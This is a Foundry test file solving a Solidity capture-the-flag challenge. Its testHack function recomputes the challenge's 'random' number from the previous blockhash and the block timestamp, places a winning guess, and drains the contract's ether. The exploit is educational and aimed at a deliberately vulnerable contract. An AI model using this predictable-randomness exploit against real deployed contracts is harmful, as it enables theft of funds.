// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "src/GuessTheNewNumber.sol";
import "forge-std/Test.sol";

contract GuessTheNewNumberTest is Test {
    GuessTheNewNumberChallenge private guessthenewnumber;
    address private constant ALICE = address(0x1);
    
    function setUp() external {
        vm.startPrank(ALICE);
        vm.deal(ALICE, 10 ether);
        guessthenewnumber = new GuessTheNewNumberChallenge{value: 1e18}();
    }

    function testHack() external {
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        (bool success, ) = address(guessthenewnumber).call{value: 1e18}(abi.encodeWithSignature("guess(uint8)", answer));
        require(success, "tx failed");
        assertEq(address(guessthenewnumber).balance, 0);
        vm.stopPrank();
    }
}